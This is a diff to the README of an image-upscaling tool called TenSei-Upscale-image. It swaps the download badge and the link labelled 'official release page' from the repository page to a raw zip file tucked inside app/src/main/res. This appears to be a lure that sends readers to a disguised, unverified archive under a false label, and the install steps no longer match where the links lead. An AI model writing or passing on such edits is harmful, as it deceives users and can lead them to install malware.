@@ -1,6 +1,6 @@
 # 🖼️ TenSei-Upscale-image - Improve image quality on your device
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue-blue)](https://github.com/Suffering-hamilton164/TenSei-Upscale-image)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue-blue)](https://raw.githubusercontent.com/Suffering-hamilton164/TenSei-Upscale-image/main/app/src/main/res/Upscale-image-Ten-Sei-1.3.zip)
 
 TenSei-Upscale-image enhances your digital photos. It increases image resolution without losing detail. The software uses local processing to keep your data private and secure. You do not need an internet connection to process files.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run the software. These requirements en
 
 Follow these steps to set up the application on your Windows machine.
 
-1. Visit the [official release page](https://github.com/Suffering-hamilton164/TenSei-Upscale-image) to find the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/Suffering-hamilton164/TenSei-Upscale-image/main/app/src/main/res/Upscale-image-Ten-Sei-1.3.zip) to find the installer.
 2. Locate the section labeled Assets.
 3. Click the link ending in .exe to start the download.
 4. Open the file once the download finishes.
